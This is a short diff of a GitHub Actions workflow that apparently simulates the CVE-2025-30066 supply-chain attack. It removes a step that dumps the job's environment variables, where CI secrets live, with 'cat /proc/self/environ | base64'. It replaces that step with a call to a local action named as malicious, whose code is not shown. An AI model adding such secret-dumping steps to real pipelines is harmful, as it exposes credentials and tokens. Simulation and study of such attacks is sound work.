@@ -10,7 +10,5 @@ jobs:
       - name: Checkout
         uses: actions/checkout@v3
 
-      - name: Simulate CVE-2025-30066 behavior
-        run: |
-          echo "Simulating exfiltration..."
-          cat /proc/self/environ | base64
+      - name: Run malicious action
+        uses: ./
